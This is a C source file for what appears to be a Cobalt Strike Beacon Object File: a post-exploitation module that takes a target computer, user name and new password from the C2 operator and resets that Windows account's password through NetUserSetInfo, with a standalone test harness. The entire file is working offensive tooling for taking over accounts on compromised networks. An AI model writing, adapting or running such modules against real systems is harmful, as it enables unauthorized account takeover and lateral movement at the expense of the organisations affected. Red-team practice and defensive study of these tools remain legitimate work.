#include <windows.h>
#include <stdio.h>
#include <lmaccess.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"

DWORD setuserpass(const wchar_t * server, const wchar_t *username, wchar_t * password)
{
	USER_INFO_1003 newpass = {0};
	NET_API_STATUS ret = NERR_Success;
	DWORD parm_err = 0;
	newpass.usri1003_password = password;

	ret = NETAPI32$NetUserSetInfo(server, username, 1003, (LPBYTE) &newpass, &parm_err);
	if(ret != NERR_Success)
	{
		BeaconPrintf(CALLBACK_ERROR, "Unable to set user password: %lX\n", ret);
		goto setuserpass_end;
	}

	internal_printf("User password should have been set\n");

setuserpass_end:

	return ret;
}

#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	const wchar_t * computer = (const wchar_t *)BeaconDataExtract(&parser, NULL);
	const wchar_t * user = (const wchar_t *)BeaconDataExtract(&parser, NULL);
	wchar_t * pass = (wchar_t *)BeaconDataExtract(&parser, NULL);
	
	if(!bofstart())
	{
		return;
	}

	internal_printf("Setting password for %S\\%S to %S\n", computer, user, pass);

	dwErrorCode = setuserpass(computer, user, pass);
	if ( ERROR_SUCCESS != dwErrorCode )
	{
		BeaconPrintf(CALLBACK_ERROR, "setuserpass failed: %lX\n", dwErrorCode);
		goto go_end;
	}

	internal_printf("SUCCESS.\n");

go_end:
	printoutput(TRUE);
	
	bofstop();
};
#else
#define TEST_USERNAME L"user"
#define TEST_HOSTNAME L""
#define TEST_PASSWORD L"Test123!"
int main(int argc, char ** argv)
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	LPCWSTR lpswzHostName = TEST_HOSTNAME;
	LPCWSTR lpswzUserName = TEST_USERNAME;
	LPWSTR lpswzPassword = TEST_PASSWORD;

	internal_printf("Setting password for %S\\%S to %S\n", lpswzHostName, lpswzUserName, lpswzPassword);

	dwErrorCode = setuserpass(lpswzHostName, lpswzUserName, lpswzPassword);
	if ( ERROR_SUCCESS != dwErrorCode )
	{
		BeaconPrintf(CALLBACK_ERROR, "setuserpass failed: %lX\n", dwErrorCode);
		goto main_end;
	}

	internal_printf("SUCCESS.\n");

main_end:
	return dwErrorCode;
}
#endif
